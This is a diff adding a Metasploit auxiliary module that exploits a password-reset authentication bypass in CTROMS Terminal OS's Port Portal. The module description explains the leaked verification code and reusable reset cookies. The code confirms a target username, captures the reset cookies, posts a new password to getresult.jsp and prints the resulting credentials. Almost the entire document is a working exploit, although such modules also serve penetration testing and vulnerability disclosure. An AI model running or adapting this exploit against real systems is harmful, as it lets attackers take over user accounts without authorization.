@@ -1,0 +1,131 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'CTROMS Terminal OS - Port Portal "Password Reset" Authentication Bypass' ,
+      'Description'    => %q{
+        This module exploits an authentication bypass in CTROMS, triggered by password reset verification code disclosure.
+        In order to exploit this vulnerability, the username must be known.
+        Exploiting this vulnerability create a new password for the user you specified and present it to you.
+
+        The "verification code" and "cookie generate" functions required to reset the password contain vulnerability.
+        When the "userId" parameter is posted to "getverificationcode.jsp", a verification code is transmitted to the account's phone number for password reset. 
+        But this verification code written in the database is also reflected in the response of the request. 
+        The first vector would be to use this verification code.
+        The second vector is the "rand" cookie values returned in this request. These values are md5.
+        If these values are assigned in the response, password reset can be done via these cookie values. 
+        Ex: [ Cookie: 6fb36ecf2a04b8550ba95603047fe85=fae0bKBGtKBKtKh.wKA.vLBmuLxmuM.; 34d1c350632806406ecc517050da0=b741baa96686a91d4461145e40a9c2df ]
+      },
+      'References'     =>
+        [
+          [ 'CVE', '' ],
+          [ 'URL', 'https://www.pentest.com.tr/exploits/CTROMS-Terminal-OS-Port-Portal-Password-Reset-Authentication-Bypass.html' ],
+          [ 'URL', 'https://www.globalservices.bt.com' ]
+        ],
+      'Author'         =>
+        [
+          'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
+        ],
+      'License'        => MSF_LICENSE,
+      'DisclosureDate' => "March 2 2020",
+      'DefaultOptions' => { 'SSL' => true }
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptString.new('USERNAME', [true, 'Username']),
+        OptString.new('PASSWORD', [true, 'Password for the reset', Rex::Text.rand_text_alphanumeric(12)])
+      ])
+  end
+
+  def peer
+    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+  end
+
+  def check
+    begin
+    res = send_request_cgi({
+      			      'method' => 'POST',
+     			      'ctype'  => 'application/x-www-form-urlencoded',
+      			      'uri' => normalize_uri(target_uri.path, 'getverificationcode.jsp'),
+      			      'headers' =>
+        			{
+          			   'Referer' => "#{peer}/verification.jsp"
+        			},
+                               'data' => "userId=#{Rex::Text.rand_text_alphanumeric(8)}"
+      			     })
+    rescue
+      return Exploit::CheckCode::Unknown
+    end
+
+    if res.code == 200 and res.body.include? '"rand"'   
+      return Exploit::CheckCode::Appears
+    end
+
+    return Exploit::CheckCode::Safe
+  end
+
+  def run
+    unless Exploit::CheckCode::Appears == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+    res = send_request_cgi({
+      			      'method' => 'POST',
+     			      'ctype'  => 'application/x-www-form-urlencoded',
+      			      'uri' => normalize_uri(target_uri.path, 'getuserinfo.jsp'),
+      			      'headers' =>
+        			{
+          			   'Referer' => "#{peer}/verification.jsp"
+        			},
+                               'data' => "userId=#{datastore["USERNAME"]}"
+      			     })
+
+    if res.code == 200 and res.body.include? '"mobileMask"'   
+      print_good("Excellent! password resettable for #{datastore["USERNAME"]}")
+    else 
+      fail_with(Failure::NotVulnerable, 'The user you specified is not valid')
+    end
+
+    begin
+
+     res = send_request_cgi({
+      			      'method' => 'POST',
+     			      'ctype'  => 'application/x-www-form-urlencoded',
+      			      'uri' => normalize_uri(target_uri.path, 'getverificationcode.jsp'),
+      			      'headers' =>
+        			{
+          			   'Referer' => "#{peer}/verification.jsp"
+        			},
+                               'data' => "userId=#{datastore["USERNAME"]}"
+      			     })
+
+      @cookie = res.get_cookies
+
+      res = send_request_cgi({
+      			      'method' => 'POST',
+     			      'ctype'  => 'application/x-www-form-urlencoded',
+      			      'uri' => normalize_uri(target_uri.path, 'getresult.jsp'),
+			      'cookie' => @cookie,
+      			      'headers' =>
+        			{
+          			   'Referer' => "#{peer}/verification.jsp"
+        			},
+                               'data' => "userId=#{datastore["USERNAME"]}&password=#{datastore["PASSWORD"]}"
+      			     })
+      if res.body.include? 'result":10'
+         print_good("boom! Password successfully reseted.")
+         print_good("Username : #{datastore["USERNAME"]}")
+         print_good("Password : #{datastore["PASSWORD"]}")
+      else
+         fail_with(Failure::BadConfig, "Unknown error while resetting the password. Response: #{res.code}")
+      end
+    end
+  end
+end
